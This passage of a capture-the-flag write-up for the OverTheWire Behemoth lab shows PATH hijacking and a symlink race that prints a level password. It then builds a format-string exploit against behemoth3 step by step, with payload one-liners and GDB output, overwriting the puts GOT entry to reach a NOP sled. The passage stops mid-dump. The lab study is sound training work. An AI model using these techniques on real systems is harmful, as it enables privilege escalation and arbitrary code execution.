id="t.020493e774b6f43818ca1d80d5e54c3de2e7660d"></a><a id="t.24"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth2</span><span class="c3">@behemoth</span><span class="c0">:/tmp/pathprivesc</span><span class="c3">$ </span><span class="c8">/behemoth/behemoth2<br>behemoth3</span><span class="c3">@behemoth</span><span class="c0">:/tmp/pathprivesc</span><span class="c3">$ </span><span class="c8">whoami<br>behemoth3</span></p></td></tr></table><h4 class="c11" id="h.pshhhr55tmpg"><span class="c22 c44">Path Privesc (Cat)</span></h4><p class="c12"><span class="c13">The same methodology used for the touch command can be used for the cat command. As seen from the analysis, the cat command is also being called without using its full path:</span></p><a id="t.1db06d14e3040e05c87c1120d1dbb9edddeb9532"></a><a id="t.25"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth2</span><span class="c3">@behemoth</span><span class="c0">:/tmp/pathprivesc</span><span class="c3">$ </span><span class="c8">echo &ldquo;/bin/bash&rdquo; &gt; cat<br>behemoth2</span><span class="c3">@behemoth</span><span class="c0">:/tmp/pathprivesc</span><span class="c3">$ </span><span class="c8">chmod 777 cat<br>behemoth2</span><span class="c3">@behemoth</span><span class="c0">:/tmp/pathprivesc</span><span class="c3">$ </span><span class="c8">export PATH=.</span><span class="c0">:</span><span class="c3">$PATH</span><span class="c8"><br>behemoth2</span><span class="c3">@behemoth</span><span class="c0">:/tmp/pathprivesc</span><span class="c3">$ </span><span class="c8">/behemoth/behemoth2<br></span><span class="c0">touch:</span><span class="c8">&nbsp;cannot touch </span><span class="c0">&#39;29678&#39;</span><span class="c8">: Permission denied<br>behemoth3</span><span class="c3">@behemoth</span><span class="c0">:/tmp/pathprivesc</span><span class="c3">$ </span><span class="c52 c51">whoami</span></p><p class="c1"><span class="c52 c51">behemoth3</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span>This way of escalating privileges takes longer than the aforementioned one because a wait of 2000 seconds is necessary before </span><span class="c29">cat </span><span class="c13">gets executed.</span></p><h4 class="c11" id="h.6af8invi43tw"><span class="c44 c22">Symbolic Link</span></h4><p class="c12"><span class="c13">This binary could still be abused even if the cat and touch commands were executed using their full paths. A symbolic link to the behemoth3 password file can be created so that the cat command reads the password of the behemoth3 user. The name of the file must correspond to the id of the process. When the cat command reads the contents of the created file, it will be pointed to the credentials of behemoth3, and the password of the user would be printed to stdout:</span></p><a id="t.6ad32cb7d6b1024ed2a806df87445ac76228f1ac"></a><a id="t.26"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth2</span><span class="c3">@behemoth</span><span class="c0">:/tmp/behemoth2</span><span class="c3">$ </span><span class="c8">/behemoth/behemoth2 <br></span><span class="c0">touch:</span><span class="c8">&nbsp;cannot touch </span><span class="c0">&#39;10216&#39;</span><span class="c8">: Permission denied</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">Once the behemoth2 binary was executed, an error occurred stating that the file 10216 was attempted to be created, but the behemoth3 user does not have the permissions to create this file under a directory owned by behemoth2. The name of the file is leaked, meaning that a symbolic link named after this file can be created before the cat command gets executed (the time limit for creating this file is 2000 seconds).</span></p><p class="c12"><span class="c13">After logging into another session as the behemoth2 user, a symbolic link corresponding to 10216 can be created:</span></p><a id="t.3976a09bcde344add822c1f40ea15261a971f66a"></a><a id="t.27"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth2</span><span class="c3">@behemoth</span><span class="c0">:/tmp/behemoth2</span><span class="c3">$ </span><span class="c8">ln -s /etc/behemoth_pass/behemoth3 </span><span class="c4">10216</span><span class="c8"><br>behemoth2</span><span class="c3">@behemoth</span><span class="c0">:/tmp/behemoth2</span><span class="c3">$ </span><span class="c8">ls -la </span><span class="c4">10216</span><span class="c8">&nbsp;<br>lrwxrwxrwx </span><span class="c4">1</span><span class="c8">&nbsp;behemoth2 root </span><span class="c4">28</span><span class="c8">&nbsp;May </span><span class="c4">15</span><span class="c8">&nbsp;</span><span class="c4">06</span><span class="c0">:</span><span class="c4">53</span><span class="c8">&nbsp;</span><span class="c4">10216</span><span class="c8">&nbsp;-&gt; /etc/behemoth_pass/behemoth3</span></p></td></tr></table><p class="c12"><span class="c39 c16">Note that this file is pointing to the password of the behemoth3 user.</span></p><p class="c9"><span class="c13"></span></p><p class="c12"><span>After waiting for 2000 seconds, the password of the behemoth3 user gets printed out:</span></p><a id="t.4d991f6787e6ee01e89057fd5829c6b643520760"></a><a id="t.28"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c38"><span class="c8">behemoth2</span><span class="c3">@behemoth</span><span class="c0">:/tmp/behemoth2</span><span class="c3">$ </span><span class="c8">/behemoth/behemoth2 <br></span><span class="c0">touch:</span><span class="c8">&nbsp;cannot touch </span><span class="c0">&#39;10216&#39;</span><span class="c8">: Permission denied<br>nieteidiel</span></p></td></tr></table><h2 class="c19" id="h.iwgdpudcydgl"><span class="c46 c22">Behemoth 3</span></h2><p class="c12"><span class="c13">After successfully abusing the behemoth2 binary, the next challenge is behemoth3.</span></p><h3 class="c19" id="h.sazhas4fyil"><span class="c25 c22">Binary Analysis</span></h3><p class="c12"><span class="c13">We can begin the analysis by downloading the target binary on the attack box and running the checksec command against it:</span></p><a id="t.91d4e13e7e1dd4d81eb5ba2f54a15aa976345f75"></a><a id="t.29"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c0">&#9484;&#9472;[0xd4y@Writeup]&#9472;[~/business/other/overthewire/behemoth/3]</span><span class="c8"><br></span><span class="c0">&#9492;&#9472;&#9472;&#9596;</span><span class="c8">&nbsp;</span><span class="c0">$checksec</span><span class="c8">&nbsp;</span><span class="c0">behemoth3</span><span class="c8"><br></span><span class="c0">[*]</span><span class="c8">&nbsp;</span><span class="c0">&#39;/home/0xd4y/business/other/overthewire/behemoth/3/behemoth3&#39;</span><span class="c8"><br> &nbsp; &nbsp;Arch: &nbsp; &nbsp; </span><span class="c0">i386-32-little</span><span class="c8"><br> &nbsp; &nbsp;RELRO: &nbsp; &nbsp;</span><span class="c4">No</span><span class="c8">&nbsp;</span><span class="c0">RELRO</span><span class="c8"><br> &nbsp; &nbsp;Stack: &nbsp; &nbsp;</span><span class="c4">No</span><span class="c8">&nbsp;</span><span class="c0">canary</span><span class="c8">&nbsp;</span><span class="c0">found</span><span class="c8"><br> &nbsp; &nbsp;NX: &nbsp; &nbsp; &nbsp; </span><span class="c0">NX</span><span class="c8">&nbsp;</span><span class="c0">disabled</span><span class="c8"><br> &nbsp; &nbsp;PIE: &nbsp; &nbsp; &nbsp;</span><span class="c4">No</span><span class="c8">&nbsp;</span><span class="c0">PIE</span><span class="c8">&nbsp;</span><span class="c0">(0x8048000)</span><span class="c8"><br> &nbsp; &nbsp;RWX: &nbsp; &nbsp; &nbsp;</span><span class="c0">Has</span><span class="c8">&nbsp;</span><span class="c0">RWX</span><span class="c8">&nbsp;</span><span class="c0">segments</span><span class="c8"><br></span><span class="c0">&#9484;&#9472;[0xd4y@Writeup]&#9472;[~/business/other/overthewire/behemoth/3]</span><span class="c8"><br></span><span class="c0">&#9492;&#9472;&#9472;&#9596;</span><span class="c8">&nbsp;</span><span class="c0">$file</span><span class="c8">&nbsp;</span><span class="c0">behemoth3</span><span class="c8"><br>behemoth3: </span><span class="c0">ELF</span><span class="c8">&nbsp;</span><span class="c4">32</span><span class="c0">-bit</span><span class="c8">&nbsp;</span><span class="c0">LSB</span><span class="c8">&nbsp;</span><span class="c0">executable,</span><span class="c8">&nbsp;</span><span class="c0">Intel</span><span class="c8">&nbsp;</span><span class="c4">80386</span><span class="c0">,</span><span class="c8">&nbsp;</span><span class="c0">version</span><span class="c8">&nbsp;</span><span class="c4">1</span><span class="c8">&nbsp;</span><span class="c0">(SYSV),</span><span class="c8">&nbsp;</span><span class="c0">dynamically</span><span class="c8">&nbsp;</span><span class="c0">linked,</span><span class="c8">&nbsp;</span><span class="c0">interpreter</span><span class="c8">&nbsp;</span><span class="c0">/lib/ld-linux.so.2,</span><span class="c8">&nbsp;</span><span class="c0">for</span><span class="c8">&nbsp;</span><span class="c0">GNU/Linux</span><span class="c8">&nbsp;</span><span class="c4">2.6.32</span><span class="c0">,</span><span class="c8">&nbsp;</span><span class="c0">BuildID[sha1]=4c39bd8f6f54ab267675a6c5e2186d65e1eb4821,</span><span class="c8">&nbsp;</span><span class="c0">not</span><span class="c8">&nbsp;</span><span class="c0">stripped</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">From the results of checksec and file, note that the binary essentially has no protection on it. Everything that could possibly hinder debug analysis on the program is disabled. Additionally, the file is not stripped, so debug symbols will be available. </span></p><h4 class="c11" id="h.cpklvm5s2jrm"><span class="c44 c22">Behavior</span></h4><p class="c12"><span class="c13">When executing the program, we are asked to provide an identification:</span></p><a id="t.31ce203867c6344016a632a78fa2dd1637414639"></a><a id="t.30"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth3</span><span class="c3">@behemoth</span><span class="c0">:/behemoth</span><span class="c3">$ </span><span class="c8">./behemoth3<br>Identify </span><span class="c0">yourself:</span><span class="c8">&nbsp;This is a test<br>Welcome, This is a test<br><br>aaaand goodbye again.</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">After inputting a large amount of A&rsquo;s (in this example 500 A&rsquo;s were used), the program prints out a minimized version of the string:</span></p><a id="t.29095e3e52400052cd1a92419e8e3f901def8e32"></a><a id="t.31"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth3</span><span class="c3">@behemoth</span><span class="c0">:/behemoth</span><span class="c3">$ </span><span class="c8">./behemoth3<br>Identify </span><span class="c0">yourself:</span><span class="c8">&nbsp;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>aaaand goodbye again.</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">Despite 500 A&rsquo;s being passed into the buffer, only 200 A&rsquo;s were printed out. Ghidra can be implemented to further help in understanding how this binary is working:</span></p><h4 class="c11" id="h.s2k22fdd1mwn"><span class="c44 c22">Ghidra</span></h4><p class="c12"><span class="c13">Ghidra translated the assembly code of the main function into the following:</span></p><a id="t.b9e1ab3ddb9cae4edaee23b219b59317916a1468"></a><a id="t.32"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">undefined4 </span><span class="c24">main</span><span class="c4">(</span><span class="c7">void</span><span class="c4">)</span><span class="c8"><br><br>{<br> &nbsp;</span><span class="c7">char</span><span class="c8">&nbsp;local_cc [</span><span class="c4">200</span><span class="c8">];<br> &nbsp;<br> &nbsp;</span><span class="c4">printf</span><span class="c8">(</span><span class="c0">&quot;Identify yourself: &quot;</span><span class="c8">);<br> &nbsp;fgets(local_cc,</span><span class="c4">200</span><span class="c8">,</span><span class="c4">stdin</span><span class="c8">);<br> &nbsp;</span><span class="c4">printf</span><span class="c8">(</span><span class="c0">&quot;Welcome, &quot;</span><span class="c8">);<br> &nbsp;</span><span class="c4">printf</span><span class="c8">(local_cc);<br> &nbsp;</span><span class="c4">puts</span><span class="c8">(</span><span class="c0">&quot;\naaaand goodbye again.&quot;</span><span class="c8">);<br> &nbsp;</span><span class="c7">return</span><span class="c8">&nbsp;</span><span class="c4">0</span><span class="c8">;<br>}</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span>A variable called local_cc of type char is declared and is allocated 200 bytes. Afterwards, the fgets function is used to allow up to 200 bytes to be passed to the local_cc variable, and therefore this binary is not vulnerable to a buffer overflow exploit. However, the user input (local_cc) is passed directly to the printf function without any sort of sanitization. Consequently, the program is likely vulnerable to a string format exploit</span><sup><a href="#ftnt3" id="ftnt_ref3">[3]</a></sup><span class="c13">. </span></p><h3 class="c19" id="h.mez1g56y3rvw"><span class="c25 c22">Discovery of Format String Vulnerability</span></h3><p class="c12"><span class="c13">This can be verified by passing a format string into the local_cc variable:</span></p><a id="t.aea1f33f0cfa1d9c78ea9c811533d75108f34036"></a><a id="t.33"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth3</span><span class="c3">@behemoth</span><span class="c0">:/behemoth</span><span class="c3">$ </span><span class="c8">./behemoth3<br>Identify </span><span class="c0">yourself:</span><span class="c8">&nbsp;%x<br>Welcome, a7825<br><br>aaaand goodbye again.</span></p></td></tr></table><p class="c9"><span class="c13"></span></p><p class="c12"><span>Despite inputting </span><span class="c29">%x</span><span>&nbsp;into the buffer, an output of </span><span class="c29">a7825</span><span>&nbsp;was printed (note that %x is a format string to specify an unsigned int as a hexadecimal number</span><sup><a href="#ftnt4" id="ftnt_ref4">[4]</a></sup><span>). When the binary is given a format string as an input, it starts to leak memory from the stack. </span></p><p class="c12"><span>This vulnerability can be abused to overwrite memory by using the </span><span class="c29">%n</span><span class="c13">&nbsp;format string which writes the number of characters written into a pointer parameter. If the pointer parameter is an address that the binary uses, then the memory address of the function can be overwritten to point to shellcode. This can result in the execution of arbitrary code. </span></p><h4 class="c11" id="h.u0pizz3c8rpk"><span class="c44 c22">Memory Addresses of Useful Functions</span></h4><p class="c12"><span class="c13">The objdump command can be utilized to determine the addresses of functions used by the binary:</span></p><a id="t.ffb827238313f833e1eb9ea44ba000159f94309c"></a><a id="t.34"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth3@behemoth:/behemoth$ objdump -R ./behemoth3<br><br>./behemoth3: &nbsp; &nbsp; file format elf32-i386<br><br>DYNAMIC RELOCATION RECORDS<br>OFFSET &nbsp;</span><span class="c4">&nbsp;TYPE </span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;VALUE <br>08049794 R_386_GLOB_DAT &nbsp; &nbsp;__gmon_start__<br>080497c0 R_386_COPY &nbsp; &nbsp; &nbsp; &nbsp;stdin@@GLIBC_2.0<br>080497a4 R_386_JUMP_SLOT &nbsp; printf@GLIBC_2.0<br>080497a8 R_386_JUMP_SLOT &nbsp; fgets@GLIBC_2.0<br>080497ac R_386_JUMP_SLOT &nbsp; puts@GLIBC_2.0<br>080497b0 R_386_JUMP_SLOT &nbsp; __libc_start_main@GLIBC_2.</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">From the output, there are a total of three functions displayed (printf, fgets, and puts). However, the fgets and printf functions should not be overwritten, as these functions must work properly to accept the malicious payload. This leaves the puts function as the only candidate from the objdump output to be overwritten. </span></p><h4 class="c11" id="h.3jzjlah745hv"><span class="c44 c22">Overwriting Puts</span></h4><p class="c12"><span class="c13">Before being able to overwrite the memory address of puts, the user input&rsquo;s location within the stack must first be determined:</span></p><a id="t.5ea881805c14419a22cf0e81454ab4a33275e8b0"></a><a id="t.35"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth3</span><span class="c3">@behemoth</span><span class="c0">:/behemoth</span><span class="c3">$ </span><span class="c8">./behemoth3<br>Identify </span><span class="c0">yourself:</span><span class="c8">&nbsp;AAAA%x<br>Welcome, AAAA41414141<br><br>aaaand goodbye again.</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">When inputting AAAA followed by a %x format string, the hexadecimal values of the A&rsquo;s are immediately printed. This means that the user input is in the first parameter within the stack. Throughout this level, the malicious input will be directed to a file so that the payload can be constructed with the help of GDB:</span></p><h5 class="c36 c76 c85" id="h.4zk650y4xnzm"><span class="c51 c50 c61">Constructing Payload With GDB</span></h5><p class="c12"><span class="c13">Using the address of puts found by the objdump command, the following payload can be constructed:</span></p><a id="t.3d2abbdc69e825f0a436976ac9ffbf1cfaa7dc08"></a><a id="t.36"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth3</span><span class="c3">@behemoth</span><span class="c0">:/tmp/overwrite_puts</span><span class="c3">$ </span><span class="c8">python -c </span><span class="c0">&quot;print &#39;\xac\x97\x04\x08&#39;+&#39;%100x%n&#39;&quot;</span><span class="c8">&nbsp;&gt; overwrite</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span>The \xac\x97\x04\x08 string corresponds to the address of the puts function in little endian form (</span><span class="c29">0x080497ac</span><span class="c13">). Following this, the hex output of this string is printed out with a padding of 100 0&rsquo;s. This type of padding is extremely useful for controlling the value of the memory address of whatever is being overwritten. </span></p><p class="c12"><span class="c13">When this payload is inputted into the binary within GDB, a segmentation fault occurs, however the address of the puts function does not follow an expected value:</span></p><a id="t.f18df5ae4b1379ec1a654d1fb6f4413f5651ba9c"></a><a id="t.37"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">(gdb) r &lt; overwrite &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Starting </span><span class="c7">program</span><span class="c8">: /behemoth/behemoth3 &lt; overwrite<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br></span><span class="c7">Program</span><span class="c8">&nbsp;received signal SIGSEGV, Segmentation fault.<br>xf7e55137 </span><span class="c7">in</span><span class="c8">&nbsp;vfprintf () from /lib32/libc.so</span><span class="c4">.6</span><span class="c8">&nbsp; &nbsp; &nbsp;<br><br><br>(gdb) x/x x080497ac &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>x80497ac: &nbsp; &nbsp; &nbsp;x08048356</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span>Observe that the address is </span><span class="c8">x08048356</span><span>&nbsp;instead of a low value. To be exact, the value should be equal to the number of characters that are in the payload. This would mean that the value should be 4 (for the address of puts) + 100 (hex formatter) which is 104 in decimal and 0x68 in hex. Prepending </span><span class="c29">AAAA</span><span class="c13">&nbsp;to the beginning of the payload successfully overwrites the puts function:</span></p><a id="t.d42c0b48fb796777ba4d94cb0c81eb7d89123f37"></a><a id="t.38"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth3@behemoth:/tmp/overwrite_puts$ python -c </span><span class="c0">&quot;print &#39;AAAA\xac\x97\x04\x08&#39; + &#39;%100x%n&#39;&quot;</span><span class="c8">&nbsp;&gt; overwrite<br><br>(gdb) r &lt; overwrite<br>The program being debugged has been started already.<br>Start it </span><span class="c7">from</span><span class="c8">&nbsp;the beginning? (y </span><span class="c7">or</span><span class="c8">&nbsp;n) y<br>Starting program: /behemoth/behemoth3 &lt; overwrite<br>Identify yourself: Welcome,</span><span class="c4">&nbsp;AAA </span><span class="c8">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;41414141<br><br>Program received signal SIGSEGV, Segmentation fault.<br>0x0000006c </span><span class="c7">in</span><span class="c52 c51">&nbsp;?? ()</span></p><p class="c1"><span class="c52 c51">(gdb) x/x 0x080497ac</span></p><p class="c1"><span class="c52 c51">0x80497ac: &nbsp; &nbsp; &nbsp;0x0000006c</span></p><p class="c1 c45"><span class="c52 c51"></span></p></td></tr></table><p class="c12"><span class="c39">Note that the puts function points to 0x6c which is 108 in decimal (this change from 104 is a result of prepending 4 A&rsquo;s)</span></p><h3 class="c19" id="h.jagnc9qowxus"><span class="c25 c22">Exploit Development</span></h3><p class="c12"><span class="c13">With the successful overwrite of the puts function, the next step is to control the address that it points to. Currently, it points to 0x6c, but this value must be changed to point to shellcode in order for the successful execution of arbitrary code. The particular methodology used to develop this exploit will work on the basis of overwriting the puts function address two bytes at a time. &nbsp;Thus, the final exploit will look like the following:</span></p><p class="c9"><span class="c13"></span></p><p class="c47 c36"><span class="c22">&lsquo;AAAA&rsquo; + &lsquo;\xac\x97\x04\x08&rsquo; + &lsquo;AAAA&rsquo; + &lsquo;\xae\x97\x04\x08&rsquo; + NOP_SLED + SHELLCODE + FORMAT_STRINGS_TO_CONTROL_PUTS_ADDRESS</span></p><p class="c9"><span class="c13"></span></p><p class="c12"><span>Note that there are two addresses within this payload: one is the base address of the puts function, and the other is the puts address + 2 to accommodate for overwriting the address two bytes at a time. This will also mean that two %x strings must be used along with two %n&rsquo;s. Additionally, a shellcode</span><sup><a href="#ftnt5" id="ftnt_ref5">[5]</a></sup><span class="c13">&nbsp;of 23 bytes will be used.</span></p><h4 class="c11" id="h.icza0znvroe2"><span class="c44 c22">Controlling Puts Address</span></h4><p class="c12"><span class="c13">To begin the exploit, the puts address must first be controlled with the help of format string padding.</span></p><a id="t.e93c7bbc10edb9fae1729379b6ab7b9d4efe7f82"></a><a id="t.39"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">behemoth3@behemoth:/tmp/overwrite_puts$ python -c &quot;print &#39;AAAA&#39; + &#39;</span><span class="c0">\x</span><span class="c8">ac</span><span class="c0">\x</span><span class="c8">97</span><span class="c0">\x</span><span class="c8">04</span><span class="c0">\x</span><span class="c8">08&#39; + &#39;AAAA&#39; + &#39;</span><span class="c0">\x</span><span class="c8">ae</span><span class="c0">\x</span><span class="c8">97</span><span class="c0">\x</span><span class="c8">04</span><span class="c0">\x</span><span class="c8">08&#39; + &#39;</span><span class="c0">\x</span><span class="c8">90&#39;*100 + &#39;S&#39;*23 + &#39;</span><span class="c3">%100x%</span><span class="c8">n&#39;&quot; &gt; exploit</span></p></td></tr></table><p class="c82 c45"><span class="c13"></span></p><p class="c12"><span class="c13">A NOP sled of 100 bytes is used before the shellcode of 23 bytes (denoted by the placeholder &lsquo;S&rsquo;) is declared. Following the shellcode is a padding of 100 bytes to the hex format specifier which results in the puts address of 0xef when executed:</span></p><a id="t.ec9963104028509b2ce5c31fc993b784389d9d54"></a><a id="t.40"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">(gdb) r &lt; exploit<br>Starting </span><span class="c7">program</span><span class="c8">: /behemoth/behemoth3 &lt; exploit<br>Identify yourself: Welcome, AAAAAASSSSSSSSSSSSSSSSSSSSSSS &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c4">41414141</span><span class="c8"><br><br></span><span class="c7">Program</span><span class="c8">&nbsp;received signal SIGSEGV, Segmentation fault.<br>x000000ef </span><span class="c7">in</span><span class="c8">&nbsp;?? ()</span></p></td></tr></table><p class="c20"><span class="c13"></span></p><p class="c12"><span class="c13">&nbsp;A segmentation fault occurred as expected, because the puts address points to a memory address that it cannot access. Ideally, the puts function should point to an address somewhere within the nop sled. Seeing as the nop sled consists of 100 bytes, there are multiple addresses that would work for this exploit:</span></p><a id="t.99b567fdcbc48f8812d2d0a9d01bd4bb1d9999e9"></a><a id="t.41"></a><table class="c5"><tr class="c10"><td class="c2" colspan="1" rowspan="1"><p class="c1"><span class="c8">(gdb) x/</span><span class="c4">40</span><span class="c8">x $esp<br></span><span class="c4">0</span><span class="c8">xffffd4d8: &nbsp; &nbsp; </span><span class="c4">0</span><span class="c8">x</span><span class="c4">080484d1</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0</span><span class="c8">x0804857e &nbsp; &nbsp; &nbsp;</span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0</span><span class="c8">x080497ac<br></span><span class="c4">0</span><span class="c8">xffffd4e8: &nbsp; &nbsp; </span><span class="c4">0x41414141</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0</span><span class="c8">x080497ae &nbsp; &nbsp; &nbsp;</span><span class="c4">0x90909090</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8"><br></span><span class="c4">0</span><span class="c8">xffffd4f8: &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8"><br></span><span class="c4">0</span><span class="c8">xffffd508: &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8"><br></span><span class="c4">0</span><span class="c8">xffffd518: &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8"><br></span><span class="c4">0</span><span class="c8">xffffd528: &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8"><br></span><span class="c4">0</span><span class="c8">xffffd538: &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8"><br></span><span class="c4">0</span><span class="c8">xffffd548: &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x90909090</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x53535353</span><span class="c8"><br></span><span class="c4">0</span><span class="c8">xffffd558: &nbsp; &nbsp; </span><span class="c4">0x53535353</span><span class="c8">&nbsp; &nbsp; &nbsp; </span><span class="c4">0x53535353</span><span 